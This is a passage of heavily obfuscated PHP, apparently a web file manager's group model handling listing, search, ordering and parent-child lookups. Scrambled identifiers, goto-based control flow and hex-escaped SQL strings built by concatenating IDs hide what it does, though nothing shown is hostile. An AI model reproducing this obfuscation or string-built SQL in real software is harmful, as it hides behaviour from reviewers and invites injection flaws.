$_SERVER[¨¤¼…´]; $CÉ¯š¯á– = array($f´ƒ¦ŠöŒÅ[2095] => $a¨é°í¨¬Î); $Cİ™¬ÍâÏ = $this->where($CÉ¯š¯á–)->find(); goto E»›¬†Şîé; béÂ²šëÕ: } protected function groupSort($d™™ÓÊØî) { $FÎ†Äµ¾²õ =& $_SERVER[¨¤¼…´]; $b¥íÏƒã = array(); foreach ($d™™ÓÊØî as $EÄßÓ³¡Òƒ => $Bš©™¦ŸŠ) { $b¥íÏƒã[] = array($FÎ†Äµ¾²õ[2095], $Bš©™¦ŸŠ, $FÎ†Äµ¾²õ[2117], $EÄßÓ³¡Òƒ + 1); } $this->saveAll($b¥íÏƒã); } public function listData() { $bİÍµ°Œö = $this->_makeOrder()->selectPage(50); $this->_listDataApply($bİÍµ°Œö[$_SERVER[¨¤¼…´][367]]); return $bİÍµ°Œö; } private function _makeOrder($Eåä«©‘Î = '') { goto C×ºÇî±; D“¿”É¾İî: $C¸…İÎ¡Şá = Input::get($aĞèéö»ó[419], $aĞèéö»ó[7], $aĞèéö»ó[2099], $A«§†™¹Í÷); $C‘ˆâ¾¥ôÖ = Input::get($aĞèéö»ó[420], $aĞèéö»ó[7], $aĞèéö»ó[2175], array($aĞèéö»ó[2175], $aĞèéö»ó[416])); $C‘ˆâ¾¥ôÖ = $C÷ööÍÜ´Ï[$C‘ˆâ¾¥ôÖ]; goto FÔ¢Ş›ÜÜœ; C×ºÇî±: $aĞèéö»ó =& $_SERVER[¨¤¼…´]; $A«§†™¹Í÷ = array($aĞèéö»ó[2095], $aĞèéö»ó[38], $aĞèéö»ó[2081], $aĞèéö»ó[201]); $C÷ööÍÜ´Ï = array($aĞèéö»ó[414] => $aĞèéö»ó[415], $aĞèéö»ó[416] => $aĞèéö»ó[417]); goto D“¿”É¾İî; FÔ¢Ş›ÜÜœ: $Eåä«©‘Î = $Eåä«©‘Î . "{$C¸…İÎ¡Şá}\x20{$C‘ˆâ¾¥ôÖ}\54\40\147\162\157\x75\160\111\104\x20\x61\x73\143"; return $this->order($Eåä«©‘Î); goto AÚôç­Á×; AÚôç­Á×: } public function listChild($BŸ”‚Ÿ÷ÏĞ) { $e—“Î†¯²… =& $_SERVER[¨¤¼…´]; $Cæ³âœíÍğ = $this->where(array($e—“Î†¯²…[474] => $BŸ”‚Ÿ÷ÏĞ))->_makeOrder()->selectPage(200); $this->_listDataApply($Cæ³âœíÍğ[$e—“Î†¯²…[367]]); return $Cæ³âœíÍğ; } public function listByID($D¨†ŠßÉÑî) { $fÙ³¥… =& $_SERVER[¨¤¼…´]; if (!$D¨†ŠßÉÑî) { return array(); } $CÑ‹¯Õøç¡ = array($fÙ³¥…[2095] => array($fÙ³¥…[7], $D¨†ŠßÉÑî)); $E‚Í“ŠâÇ„ = $this->where($CÑ‹¯Õøç¡)->select(); $this->_listDataApply($E‚Í“ŠâÇ„); return $E‚Í“ŠâÇ„; } public function listSearch($fÏÃšÆ†) { goto B÷¢ô¸øŞ«; Fë˜“³Ó§«: if ($eî§º¼±¯) { $D›ˆÉù¾› = $this->getInfoSimple($eî§º¼±¯); $AÙ­¡À = $D›ˆÉù¾›[$F«”ˆØÜŠ…[472]] . $eî§º¼±¯ . $F«”ˆØÜŠ…[497]; $EÂà–‡µîš = array($EÂà–‡µîš, array($F«”ˆØÜŠ…[472] => array($F«”ˆØÜŠ…[741], $AÙ­¡À))); } $F‡¬ó ”âà = $this->_makeOrder()->where($EÂà–‡µîš)->selectPage(20); $F‡¬ó ”âà = $F‡¬ó ”âà ? $F‡¬ó ”âà : array(); goto Eß­ÑÔÏÇò; B÷¢ô¸øŞ«: $F«”ˆØÜŠ… =& $_SERVER[¨¤¼…´]; $FˆŒ¸¢é¤Û = $fÏÃšÆ†[$F«”ˆØÜŠ…[2176]]; $eî§º¼±¯ = isset($fÏÃšÆ†[$F«”ˆØÜŠ…[2177]]) ? $fÏÃšÆ†[$F«”ˆØÜŠ…[2177]] : !1; goto eºÜÇè”Ÿî; Eß­ÑÔÏÇò: if (!$F‡¬ó ”âà || count($F‡¬ó ”âà[$F«”ˆØÜŠ…[367]]) < 5 && Input::check($FˆŒ¸¢é¤Û, $F«”ˆØÜŠ…[319])) { goto FÅô°È´É«; c‡†Ô¿™†»: $AñµôåÚµ = array_merge($eİ²‘åîŒì, $cŒ“¾Ğ°¿ù, $F‡¬ó ”âà[$F«”ˆØÜŠ…[367]]); $F‡¬ó ”âà[$F«”ˆØÜŠ…[367]] = array_unique_by_key($AñµôåÚµ, $F«”ˆØÜŠ…[2095]); $F‡¬ó ”âà[$F«”ˆØÜŠ…[364]][$F«”ˆØÜŠ…[365]] = count($F‡¬ó ”âà[$F«”ˆØÜŠ…[367]]); goto a§Åöµ¯é; a§Åöµ¯é: $F‡¬ó ”âà[$F«”ˆØÜŠ…[364]][$F«”ˆØÜŠ…[366]] = ceil($F‡¬ó ”âà[$F«”ˆØÜŠ…[364]][$F«”ˆØÜŠ…[365]] / $F‡¬ó ”âà[$F«”ˆØÜŠ…[364]][$F«”ˆØÜŠ…[362]]); goto e÷¢ò»ÖŒ; FÅô°È´É«: $A›å˜ŒÇÄ¥ = $this->groupChildrenAll($eî§º¼±¯); $eİ²‘åîŒì = $this->_searchFromMeta($F«”ˆØÜŠ…[427], $FˆŒ¸¢é¤Û, 10, $A›å˜ŒÇÄ¥); $cŒ“¾Ğ°¿ù = $this->_searchFromMeta($F«”ˆØÜŠ…[428], $FˆŒ¸¢é¤Û, 10, $A›å˜ŒÇÄ¥); goto c‡†Ô¿™†»; e÷¢ò»ÖŒ: } $this->_listDataApply($F‡¬ó ”âà[$F«”ˆØÜŠ…[367]]); return $F‡¬ó ”âà; goto BöÃ¤«éŠŠ; eºÜÇè”Ÿî: if (!trim($FˆŒ¸¢é¤Û)) { return !1; } $FˆŒ¸¢é¤Û = str_replace($F«”ˆØÜŠ…[2178], $F«”ˆØÜŠ…[2179], $FˆŒ¸¢é¤Û); $EÂà–‡µîš = array($F«”ˆØÜŠ…[2095] => array($F«”ˆØÜŠ…[741], "\45{$FˆŒ¸¢é¤Û}\x25"), $F«”ˆØÜŠ…[38] => array($F«”ˆØÜŠ…[741], "\45{$FˆŒ¸¢é¤Û}\45"), $F«”ˆØÜŠ…[900] => $F«”ˆØÜŠ…[2180]); goto Fë˜“³Ó§«; BöÃ¤«éŠŠ: } protected function groupChildrenAll($eèî§æòÌ­) { $f¸ĞŞÒÅÖ =& $_SERVER[¨¤¼…´]; if (!$eèî§æòÌ­) { return !1; } if (is_string($eèî§æòÌ­)) { $eèî§æòÌ­ = array($eèî§æòÌ­); } $BäÂÜ°à¤‡ = $eèî§æòÌ­; foreach ($eèî§æòÌ­ as $aÂ™ãÊâÇ) { $D©³–¬«Õ× = $this->getInfoSimple($aÂ™ãÊâÇ); $F†ãè˜Ù®¯ = array($f¸ĞŞÒÅÖ[472] => array($f¸ĞŞÒÅÖ[741], $D©³–¬«Õ×[$f¸ĞŞÒÅÖ[472]] . $aÂ™ãÊâÇ . $f¸ĞŞÒÅÖ[497])); $F§œôßŠ†– = $this->field($f¸ĞŞÒÅÖ[2095])->where($F†ãè˜Ù®¯)->select(); $BäÂÜ°à¤‡ = array_merge($BäÂÜ°à¤‡, array_to_keyvalue($F§œôßŠ†–, $f¸ĞŞÒÅÖ[43], $f¸ĞŞÒÅÖ[2095])); } return array_unique($BäÂÜ°à¤‡); } private function _searchFromMeta($a§ÅÄÖ±š, $eÙ††Øõ¨, $c¹ëÈ÷«•ç, $e±èîœµ¼‘) { goto bƒĞ†Ó»; D‰«¨Õä®: $BˆİƒôˆÀŠ = array_to_keyvalue($BˆİƒôˆÀŠ, $AåÂ÷„×÷Å[43], $AåÂ÷„×÷Å[2095]); $A…‘×êï½Â = $this->where(array($AåÂ÷„×÷Å[2172] => array($AåÂ÷„×÷Å[7], $BˆİƒôˆÀŠ)))->select(); if (!$A…‘×êï½Â) { return array(); } goto cµªÖÍÄª; bƒĞ†Ó»: $AåÂ÷„×÷Å =& $_SERVER[¨¤¼…´]; $eÙ††Øõ¨ = strtolower($eÙ††Øõ¨); $AÒÒÒ‹ªØÜ = array($AåÂ÷„×÷Å[99] => $a§ÅÄÖ±š, $AåÂ÷„×÷Å[372] => array($AåÂ÷„×÷Å[741], "\x25{$eÙ††Øõ¨}\x25")); goto cÒîÉ”Ãá; cÒîÉ”Ãá: if ($e±èîœµ¼‘) { $AÒÒÒ‹ªØÜ[$AåÂ÷„×÷Å[2095]] = array($AåÂ÷„×÷Å[7], $e±èîœµ¼‘); } $BˆİƒôˆÀŠ = Model($AåÂ÷„×÷Å[2181])->where($AÒÒÒ‹ªØÜ)->limit($c¹ëÈ÷«•ç)->select(); if (!$BˆİƒôˆÀŠ) { return array(); } goto D‰«¨Õä®; cµªÖÍÄª: return $A…‘×êï½Â; goto A©‡ÍÄ«î¶; A©‡ÍÄ«î¶: } protected function _listDataApplyItem($Cˆğ†òá) { $EÊŸ×áŠ¼— = array($Cˆğ†òá); $this->_listDataApply($EÊŸ×áŠ¼—); return $EÊŸ×áŠ¼—[0]; } protected function _listDataApply(&$EßÆÍğîçØ) { goto AÙ›¼Ÿ»Ì˜; cŸ±‰»¯‹×: $this->_listAppendChildren($EßÆÍğîçØ); $this->_listAppendChildrenMember($EßÆÍğîçØ); $this->_listAppendMeta($EßÆÍğîçØ, $bŠ¤Ş…ÄÑğ); goto CÅÖã¸Ä½; CÅÖã¸Ä½: $this->_listAppendParent($EßÆÍğîçØ); $this->_listAppendSourceRoot($EßÆÍğîçØ, $bŠ¤Ş…ÄÑğ); goto fàÕÜ¦öÑñ; AÙ›¼Ÿ»Ì˜: $bÊ”³´¨å¨ =& $_SERVER[¨¤¼…´]; if (!$EßÆÍğîçØ) { return; } $bŠ¤Ş…ÄÑğ = array_to_keyvalue($EßÆÍğîçØ, $bÊ”³´¨å¨[43], $bÊ”³´¨å¨[2095]); goto cŸ±‰»¯‹×; fàÕÜ¦öÑñ: } private function _listAppendChildren(&$F°£ã×Ë„‰) { goto CŠ£¿ìœ…ì; Dµ‹ñäÈÒ: $fÔ¯ŸÉÂ£· = array_to_keyvalue($fÔ¯ŸÉÂ£·, $DÀµàÖ‰Ã¬[463]); foreach ($F°£ã×Ë„‰ as &$Cšğ’Œë‚å) { $Cšğ’Œë‚å[$DÀµàÖ‰Ã¬[2182]] = isset($fÔ¯ŸÉÂ£·[$Cšğ’Œë‚å[$DÀµàÖ‰Ã¬[2095]] . $DÀµàÖ‰Ã¬[2183]]); } unset($Cšğ’Œë‚å); goto Eƒµ¹†¹èÕ; FŒô»Š‚…á: $f½ÕÜá™„„ = count($F°£ã×Ë„‰); $C¢Å¸í¡âæ = $this->tablePrefix . $this->tableName; for ($fßŠÏ†ø = 0, $FøÖ±ˆ¯® = 0; $fßŠÏ†ø < $f½ÕÜá™„„; $fßŠÏ†ø++) { $FøÖ±ˆ¯®++; $E®†³Æñó = $F°£ã×Ë„‰[$fßŠÏ†ø][$DÀµàÖ‰Ã¬[2095]]; $D‹‘ÌñÅ²‹ .= "\123\105\114\105\103\124\40\52\x20\106\x52\117\115\40\50\123\x45\114\x45\103\124\x20\x27{$E®†³Æñó}\137\143\150\x69\154\x64\47\x20\141\163\x20\x68\x61\x73\x20\106\x52\117\115\40\140{$C¢Å¸í¡âæ}\140\x20\x77\150\x65\x72\x65\x20\x70\x61\162\x65\156\x74\x49\104\x3d{$E®†³Æñó}\x20\154\151\155\151\x74\x20\61\51\40\141\163\x20\x74\142\x5f{$E®†³Æñó}\x20\x75\156\151\157\156\x20\141\x6c\154\x20"; if (($FøÖ±ˆ¯® >= 20 || $fßŠÏ†ø == $f½ÕÜá™„„ - 1) && $D‹‘ÌñÅ²‹) { $D‹‘ÌñÅ²‹ = substr($D‹‘ÌñÅ²‹, 0, -strlen($DÀµàÖ‰Ã¬[462])); $Bâ‰‰´±¬İ = $this->query($D‹‘ÌñÅ²‹); $fÔ¯ŸÉÂ£· = array_merge($fÔ¯ŸÉÂ£·, $Bâ‰‰´±¬İ); $FøÖ±ˆ¯® = 0; $D‹‘ÌñÅ²‹ = $DÀµàÖ‰Ã¬[43]; } } goto Dµ‹ñäÈÒ; CŠ£¿ìœ…ì: $DÀµàÖ‰Ã¬ =& $_SERVER[¨¤¼…´]; $D‹‘ÌñÅ²‹ = $DÀµàÖ‰Ã¬[18]; $fÔ¯ŸÉÂ£· = array(); goto FŒô»Š‚…á; Eƒµ¹†¹èÕ: } private function _listAppendChildrenMember(&$AÑˆ±ÏÆ¨Ë) { goto bºƒ«Û˜Õ; c¼´àö„Ñ²: $AÜ‘Ğ©‹¸ = count($AÑˆ±ÏÆ¨Ë); $AŒõ¼ÇÂÉ = $this->tablePrefix . $dªï—îİË­[2174]; for ($fíøÌ„°Œ = 0, $AÛ„²Æ£¤Š = 0; $fíøÌ„°Œ < $AÜ‘Ğ©‹¸; $fíøÌ„°Œ++) { $AÛ„²Æ£¤Š++; $cò¯å«„íë = $AÑˆ±ÏÆ¨Ë[$fíøÌ„°Œ][$dªï—îİË­[2095]]; $Eåâ´ì›ğ· .= "\x53\x45\x4c\105\103\124\40\x2a\x20\106\122\117\x4d\x20\x28\123\105\x4c\105\103\124\x20\47{$cò¯å«„íë}\x5f\x63\x68\151\154\144\47\40\141\163\x20\x68\141\x73\x20\106\122\x4f\x4d\x20\x60{$AŒõ¼ÇÂÉ}\x60\x20\167\x68\145\x72\x65\40\147\x72\x6f\x75\160\111\104\x3d{$cò¯å«„íë}\x20\x6c\151\155\151\x74\x20\x31\51\40\x61\x73\x20\164\x62\137{$cò¯å«„íë}\40\165\156\x69\157\156\40\x61\154\154\40"; if (($AÛ„²Æ£¤Š >= 20 || $fíøÌ„°Œ == $AÜ‘Ğ©‹¸ - 1) && $Eåâ´ì›ğ·) { $Eåâ´ì›ğ· = substr($Eåâ´ì›ğ·, 0, -strlen($dªï—îİË­[462])); $C¹ª­×ã = $this->query($Eåâ´ì›ğ·); $cø†ßî§¢ = array_merge($cø†ßî§¢, $C¹ª­×ã); $AÛ„²Æ£¤Š = 0; $Eåâ´ì›ğ· = $dªï—îİË­[43]; } } goto c¶ÌŞÎ‚«ò; bºƒ«Û˜Õ: $dªï—îİË­ =& $_SERVER[¨¤¼…´]; $Eåâ´ì›ğ· = $dªï—îİË­[18]; $cø†ßî§¢ = array(); goto c¼´àö„Ñ²; c¶ÌŞÎ‚«ò: $cø†ßî§¢ = array_to_keyvalue($cø†ßî§¢, $dªï—îİË­[463]); foreach ($AÑˆ±ÏÆ¨Ë as &$dİâŠ‡Ã„Ã) { $dİâŠ‡Ã„Ã[$dªï—îİË­[2184]] = isset($cø†ßî§¢[$dİâŠ‡Ã„Ã[$dªï—îİË­[2095]] . $dªï—îİË­[2183]]); } unset($dİâŠ‡Ã„Ã); goto B¿æ¹ÌÕé‹; B¿æ¹ÌÕé‹: } private function _listAppendMeta(&$E—Â å·Õã, $aŸˆ‘ñ£ù) { goto Aå’Ù¦¥Œ; Aå’Ù¦¥Œ: $a³™ÏÏëàù =& $_SERVER[¨¤¼…´]; $F³£ôÚ´¥ö = array($a³™ÏÏëàù[2095] => array($a³™ÏÏëàù[7], $aŸˆ‘ñ£ù)); $C„¢›™¯¦ = Model($a³™ÏÏëàù[2173])->where($F³£ôÚ´¥ö)->select(); goto bëª’‚ĞôÒ; bá¾î¨Ø®õ: foreach ($E—Â å·Õã as &$f•œø¥İ¼») { $f•œø¥İ¼»[$a³™ÏÏëàù[429]] = array(); if (isset($C„¢›™¯¦[$f•œø¥İ¼»[$a³™ÏÏëàù[2095]]])) { $f•œø¥İ¼»[$a³™ÏÏëàù[429]] = $C„¢›™¯¦[$f•œø¥İ¼»[$a³™ÏÏëàù[2095]]]; } } unset($f•œø¥İ¼»); goto B‚ç½´ÙŒ; bëª’‚ĞôÒ: $C„¢›™¯¦ = array_to_keyvalue_group($C„¢›™¯¦, $a³™ÏÏëàù[2095]); foreach ($C„¢›™¯¦ as &$cºÑ¯å¸Ñ¦) { $cºÑ¯å¸Ñ¦ = array_to_keyvalue($cºÑ¯å¸Ñ¦, $a³™ÏÏëàù[99], $a³™ÏÏëàù[372]); } unset($cºÑ¯å¸Ñ¦); goto bá¾î¨Ø®õ; B‚ç½´ÙŒ: } protected function parentLevelArray($dËô¡Â¶ç) { $EËá‰ƒÛ• =& $_SERVER[¨¤¼…´]; $dËô¡Â¶ç = explode($EËá‰ƒÛ•[57], trim($dËô¡Â¶ç, $EËá‰ƒÛ•[57])); $dËô¡Â¶ç = array_remove_value($dËô¡Â¶ç, $EËá‰ƒÛ•[481]); return $dËô¡Â¶ç; } private function _listAppendParent(&$fì–æÕãÂŒ) { goto eø¿İ‹Æ¢ê; eø¿İ‹Æ¢ê: $CÅñ¦ƒ÷˜† =& $_SERVER[¨¤¼…´]; $DÎÈİ ·© = array(); foreach ($fì–æÕãÂŒ as &$fæÆÃ½ğÈ’) { $DÎÈİ ·©[$fæÆÃ½ğÈ’[$CÅñ¦ƒ÷˜†[2095]]] = $fæÆÃ½ğÈ’[$CÅñ¦ƒ÷˜†[38]]; $e­Á¡ô±ˆ¤ = $this->parentLevelArray($fæÆÃ½ğÈ’[$CÅñ¦ƒ÷˜†[472]]); foreach ($e­Á¡ô±ˆ¤ as $EéÚ°ÍÈö) { if (!isset($DÎÈİ ·©[$EéÚ°ÍÈö])) { $DÎÈİ ·©[$EéÚ°ÍÈö] = 0; } } } goto d´ˆÄÉŒ˜Ï; d´ˆÄÉŒ˜Ï: unset($fæÆÃ½ğÈ’); $DœŞŠáùÅº = array(); foreach ($DÎÈİ ·© as $AéĞ…ÉÓƒÈ => $e‰Œ´Ìë‘) { if (!$e‰Œ´Ìë‘) { $DœŞŠáùÅº[] = $AéĞ…ÉÓƒÈ; } } goto dÈÆÕ¸‰İ„; F‰…â‘š©: unset($fæÆÃ½ğÈ’); goto BåËŞ“í’†; dÈÆÕ¸‰İ„: if ($DœŞŠáùÅº) { $b¹ÀœÀ›ó… = array($CÅñ¦ƒ÷˜†[2172] => array($CÅñ¦ƒ÷˜†[396], $DœŞŠáùÅº)); $a½ŒŠ“±Æí = $this->field($CÅñ¦ƒ÷˜†[2185])->where($b¹ÀœÀ›ó…)->select(); $aÈÈİ‹±ùğ = array_to_keyvalue($a½ŒŠ“±Æí, $CÅñ¦ƒ÷˜†[2095], $CÅñ¦ƒ÷˜†[38]); $DÎÈİ ·© = array_merge_index($DÎÈİ ·©, $aÈÈİ‹±ùğ); } $A„ğÂ‰Æõ = $GLOBALS[$CÅñ¦ƒ÷˜†[6]][$CÅñ¦ƒ÷˜†[94]][$CÅñ¦ƒ÷˜†[2186]]; foreach ($fì–æÕãÂŒ as &$fæÆÃ½ğÈ’) { $e­Á¡ô±ˆ¤ = $this->parentLevelArray($fæÆÃ½ğÈ’[$CÅñ¦ƒ÷˜†[472]]); $dŒ’ŒÙ‘Ü = $CÅñ¦ƒ÷˜†[43]; foreach ($e­Á¡ô±ˆ¤ as $AéĞ…ÉÓƒÈ => $EéÚ°ÍÈö) { if ($A„ğÂ‰Æõ && $AéĞ…ÉÓƒÈ == 0) { continue; } $dŒ’ŒÙ‘Ü .= $DÎÈİ ·©[$EéÚ°ÍÈö] . $CÅñ¦ƒ÷˜†[8]; } if ($e­Á¡ô±ˆ¤) { $dŒ’ŒÙ‘Ü .= $fæÆÃ½ğÈ’[$CÅñ¦ƒ÷˜†[38]]; } $fæÆÃ½ğÈ’[$CÅñ¦ƒ÷˜†[476]] = str_replace($CÅñ¦ƒ÷˜†[480], $CÅñ¦ƒ÷˜†[8], $dŒ’ŒÙ‘Ü); } goto F‰…â‘š©; BåËŞ“í’†: } private function _listAppendSourceRoot(&$EñÙ½¿ó”å, $eªÛ°Ğ¾À¤) { goto B¿«„ù‡¼Á; AëÜˆ«äĞ¦: $A²¾×ßãÜÏ = Model($f£”Âñ¼Ò[742])->order($f£”Âñ¼Ò[2188])->field($Cà–„³„ã‡)->where($E×Ûø×)->select(); $A²¾×ßãÜÏ = array_to_keyvalue($A²¾×ßãÜÏ, $f£”Âñ¼Ò[469]); $A²¾×ßãÜÏ = array_remove_key($A²¾×ßãÜÏ, $f£”Âñ¼Ò[469]); goto F´…øÊÔâ¡; F´…øÊÔâ¡: foreach ($EñÙ½¿ó”å as &$e„ØË‰ó) { $e„ØË‰ó[$f£”Âñ¼Ò[403]] = $A²¾×ßãÜÏ[$e„ØË‰ó[$f£”Âñ¼Ò[2095]]] ? $A²¾×ßãÜÏ[$e„ØË‰ó[$f£”Âñ¼Ò[2095]]] : array(); } unset($e„ØË‰ó); goto B”Ş©Èœõ; B¿«„ù‡¼Á: $f£”Âñ¼Ò =& $_SERVER[¨¤¼…´]; $E×Ûø× = array($f£”Âñ¼Ò[383] => SourceModel::TYPE_GROUP, $f£”Âñ¼Ò[474] => 0, $f£”Âñ¼Ò[469] => array($f£”Âñ¼Ò[7], $eªÛ°Ğ¾À¤)); $Cà–„³„ã‡ = $f£”Âñ¼Ò[2187]; goto AëÜˆ«äĞ¦; B”Ş©Èœõ: } protected function groupMerge($d¶¿‰ğ¥È¡) { $d¶¿‰ğ¥È¡ = array_values(array_unique($d¶¿‰ğ¥È¡)); $bŠ”˜®Ê‘µ = array(); for ($FÓä—¶ˆ¦§ = 0; $FÓä—¶ˆ¦§ < count($d¶¿‰ğ¥È¡); $FÓä—¶ˆ¦§++) { $Dá­æƒ¦è† = !1; for ($a—ƒê”ÄËÛ = 0; $a—ƒê”ÄËÛ < count($d¶¿‰ğ¥È¡); $a—ƒê”ÄËÛ++) { if ($FÓä—¶ˆ¦§ == $a—ƒê”ÄËÛ) { continue; } if ($this->isParentOf($d¶¿‰ğ¥È¡[$a—ƒê”ÄËÛ], $d¶¿‰ğ¥È¡[$FÓä—¶ˆ¦§])) { $Dá­æƒ¦è† = !0; break; } } if (!$Dá­æƒ¦è†) { $bŠ”˜®Ê‘µ[] = $d¶¿‰ğ¥È¡[$FÓä—¶ˆ¦§]; } } return $bŠ”˜®Ê‘µ; } protected function isParentOf($AßôêçÒ¨…, $féÍ¤İ›±) { goto BöğÄ¢¹’Ê; BöğÄ¢¹’Ê: $cÌ´ŸİØ²æ =& $_SERVER[¨¤¼…´]; if (!$AßôêçÒ¨… || !$féÍ¤İ›± || $AßôêçÒ¨… == $féÍ¤İ›±) { return !1; } $EªÀœ°¶‘Â = $this->getInfoSimple($AßôêçÒ¨…); goto f¦˜ñà‡¤²; f¦˜ñà‡¤²: $a†ºà›ì³Ò = $this->getInfoSimple($féÍ¤İ›±); $bˆŠŒ¾»º‰ = $EªÀœ°¶‘Â[$cÌ´ŸİØ²æ[472]] . $AßôêçÒ¨… . $cÌ´ŸİØ²æ[57]; if (substr($a†ºà›ì³Ò[$cÌ´ŸİØ²æ[472]], 0, strlen($bˆŠŒ¾»º‰)) == $bˆŠŒ¾»º‰) { return !0; } goto e…Ü¼™˜; e…Ü¼™˜: return !1; goto E¶ƒÎÆñŒŞ; E¶ƒÎÆñŒŞ: } public function groupShowRoot($bÜ¢àâòøæ, $e‘Ê¡Ûµ± = false) { goto b‘ÅÈ„‡ÌÇ; dÊ§ÒÃõŸ: $e½Èœ™„ì = $this->parentLevelArray($E×ä­å‹„[$B®­ÛÏ­˜õ[472]]); $a»Ü®äô…‚ = array($bÜ¢àâòøæ); if (count($e½Èœ™„ì) == 0) { return $a»Ü®äô…‚; } goto b¦‚Ğ¶ »à; D‹‰…òÃ: return $a»Ü®äô…‚; goto EÌïøƒ¢ƒ‚; b‘ÅÈ„‡ÌÇ: $B®­ÛÏ­˜õ =& $_SERVER[¨¤¼…´]; $E×ä­å‹„ = $this->getInfo($bÜ¢àâòøæ); if (!$E×ä­å‹„) { return array(); } goto dÊ§ÒÃõŸ; b¦‚Ğ¶ »à: if ($e‘Ê¡Ûµ± && count($e½Èœ™„ì) == 1) { return $a»Ü®äô…‚; } if (!$E×ä­å‹„[$B®­ÛÏ­˜õ[429]] || !isset($E×ä­å‹„[$B®­ÛÏ­˜õ[429]][$B®­ÛÏ­˜õ[2170]]) || $E×ä­å‹„[$B®­ÛÏ­˜õ[429]][$B®­ÛÏ­˜õ[2170]] == $B®­ÛÏ­˜õ[2144]) { return $this->groupShowRoot($e½Èœ™„ì[count($e½Èœ™„ì) - 1], $e‘Ê¡Ûµ±); } if ($E×ä­å‹„[$B®­ÛÏ­˜õ[429]][$B®­ÛÏ­˜õ[2170]] == $B®­ÛÏ­˜õ[359]) { $aİ´ß‚Õˆ = explode($B®­ÛÏ­˜õ[57], $E×ä­å‹„[$B®­ÛÏ­˜õ[429]][$B®­ÛÏ­˜õ[2171]]); if ($aİ´ß‚Õˆ) { $a»Ü®äô…‚ = array_merge($a»Ü®äô…‚, $aİ´ß‚Õˆ); } } goto D‹‰…òÃ; EÌïøƒ¢ƒ‚: } protected function resetParentLevel() { $dªÂÈÚáñâ =& $_SERVER[¨¤¼…´]; $b™†—­¥Ø£ = $dªÂÈÚáñâ[2095]; $Fê½ªÅØìÛ = $this->select(); $Fê½ªÅØìÛ = array_to_keyvalue($Fê½ªÅØìÛ, $b™†—­¥Ø£); foreach ($Fê½ªÅØìÛ as $b¿¿‘â·Ö) { goto C×ÑÛ…‰¦Ù; C×ÑÛ…‰¦Ù: $EèÌÁÉ¢±Ë = $b¿¿‘â·Ö; $CŒÆ¸¤Ğ† = array(); while ($EèÌÁÉ¢±Ë[$dªÂÈÚáñâ[474]] != 0) { $CŒÆ¸¤Ğ†[] = $EèÌÁÉ¢±Ë[$dªÂÈÚáñâ[474]]; $EèÌÁÉ¢±Ë = $Fê½ªÅØìÛ[$EèÌÁÉ¢±Ë[$dªÂÈÚáñâ[474]]]; } goto D¯´†–Ó”ˆ; D¯´†–Ó”ˆ: $CŒÆ¸¤Ğ†[] = 0; $CŒÆ¸¤Ğ† = $dªÂÈÚáñâ[57] . implode($dªÂÈÚáñâ[57], array_reverse($CŒÆ¸¤Ğ†)) . $dªÂÈÚáñâ[57]; $this->setNamePinyin($b¿¿‘â·Ö[$b™†—­¥Ø£], $b¿¿‘â·Ö[$dªÂÈÚáñâ[38]]); goto D¬„ñìæàÜ; D¬„ñìæàÜ: $this->where(array($b™†—­¥Ø£ => $b¿¿‘â·Ö[$b™†—­¥Ø£]))->save(array($dªÂÈÚáñâ[538] => $CŒÆ¸¤Ğ†)); goto eƒ™‘Ü‘äÖ; eƒ™‘Ü‘äÖ: } return $Fê½ªÅØìÛ; } public function groupNameAuto($E•ÄÛˆ†éÂ, $c‘‚•¿ëŞ‚) { $BªÔŸàÀ =& $_SERVER[¨¤¼…´]; $c÷İ™¹È»„ = $this->where(array($BªÔŸàÀ[380] => $E•ÄÛˆ†éÂ))->getField($BªÔŸàÀ[38], !0); if (!$c÷İ™¹È»„ || !in_array($c‘‚•¿ëŞ‚, $c÷İ™¹È»„)) { return $c‘‚•¿ëŞ‚; } for ($fŒéš“îÀŠ = 1; $fŒéš“îÀŠ <= count($c÷İ™¹È»„) + 1; $fŒéš“îÀŠ++) { $cŞÄ¾÷Ç©¸ = $c‘‚•¿ëŞ‚ . "\50{$fŒéš“îÀŠ}\51"; if (!in_array($cŞÄ¾÷Ç©¸, $c÷İ™¹È»„)) { return $cŞÄ¾÷Ç©¸; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($F‚‚ê¯›Éç) { $bñ„Ôê¹‘¤ =& $_SERVER[¨¤¼…´]; return array($bñ„Ôê¹‘¤[2189] => array($F‚‚ê¯›Éç[0], $bñ„Ôê¹‘¤[2190]), $bñ„Ôê¹‘¤[2191] => array($F‚‚ê¯›Éç[0], $bñ„Ôê¹‘¤[2192])); } protected function get($d£ôÈŠŒ‹¦) { $E§¹Ä½´Î =& $_SERVER[¨¤¼…´]; $a°³Ó´îé = Model($E§¹Ä½´Î[471])->metaGet($d£ôÈŠŒ‹¦, $E§¹Ä½´Î[2193]); $fƒÏ°ˆâÏÛ = json_decode($a°³Ó´îé, !0); return $fƒÏ°ˆâÏÛ ? $fƒÏ°ˆâÏÛ : array($E§¹Ä½´Î[2194] => $E§¹Ä½´Î[93], $E§¹Ä½´Î[367] => array()); } protected function set($D×µèØÈ‘, $c‹µÖ‡¿£õ) { $C—Ç•©í¢‡ =& $_SERVER[¨¤¼…´]; $c‹µÖ‡¿£õ = $c‹µÖ‡¿£õ ? $c‹µÖ‡¿£õ : array($C—Ç•©í¢‡[2194] => $C—Ç•©í¢‡[93], $C—Ç•©í¢‡[367] => array()); Model($C—Ç•©í¢‡[471])->metaSet($D×µèØÈ‘, $C—Ç•©í¢‡[2193], json_encode($c‹µÖ‡¿£õ)); return Model($C—Ç•©í¢‡[471])->metaSet($D×µèØÈ‘, $C—Ç•©í¢‡[2193], json_encode($c‹µÖ‡¿£õ)); } protected function getByTagID($c«—ø¢ç»§, $E™áÜ¡•í¤) { goto eÆõÕ÷¢¸è; eÆõÕ÷¢¸è: $E†ƒñÔÖÂ¦ =& $_SERVER[¨¤¼…´]; if (!$c«—ø¢ç»§ || !$E™áÜ¡•í¤) { return !1; } if (!Model($E†ƒñÔÖÂ¦[471])->getInfoSimple($c«—ø¢ç»§)) { return !1; } goto aë÷¡éáØ©; aë÷¡éáØ©: $a˜æï®ˆ‰Ï = $this->get($c«—ø¢ç»§); if (!$a˜æï®ˆ‰Ï || !isset($a˜æï®ˆ‰Ï[$E†ƒñÔÖÂ¦[367]])) { return !1; } $F”ª¢Ç™È = array_find_by_field($a˜æï®ˆ‰Ï[$E†ƒñÔÖÂ¦[367]], $E†ƒñÔÖÂ¦[379], $E™áÜ¡•í¤); goto Dµƒñœ÷Ã±; 